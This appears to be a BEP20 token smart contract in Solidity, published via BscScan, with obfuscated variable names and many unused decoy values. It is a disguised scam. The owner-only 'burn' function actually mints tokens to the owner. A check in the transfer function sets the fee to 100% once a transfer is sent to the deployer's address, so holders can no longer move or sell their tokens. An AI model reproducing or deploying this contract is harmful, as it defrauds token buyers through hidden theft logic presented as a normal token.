/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 08:10:02 GMT
 */
pragma solidity >=0.5.11;
contract wahHyk {
mapping (address => uint256) public balanceOf;
string public  name = "uPdJIx";
string public  symbol = "cTMZkn";
uint256 public constant VRHlDf = 9+1;
address public  hLASld = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  MyJWOz = 10000000000000000;
uint256 private  KZnCLs = 10000000000000;
address public  lSLPGh = address(0);
address public  eAPwHL = address(0);
address public  WdRCOl = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  kMCbGZ = 10000000000000000000;
uint256 public  skXHtY = 10000000000000000000000000000;
uint8 public constant decimals = 18;
uint256 public  shUnxe = 100000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  lfKkCK = address(0);
uint256 public  byaccA = 100000000000000000000;
address public  hpkKBb = address(0);
uint256 public  tEFfgA = 1000000000000000000;
uint256 public  eWPDOG = 100000000000000000000000;
address public owner;
uint256 public  lvLXAY = 100000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  mrkMrQ = address(0);
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () {
lfKkCK = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "XxNRxt");
require(to != address(0), "XxNRxt");
require(amount <= balanceOf[from], "XxNRxt");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* VRHlDf/KZnCLs ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==lfKkCK){
KZnCLs = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}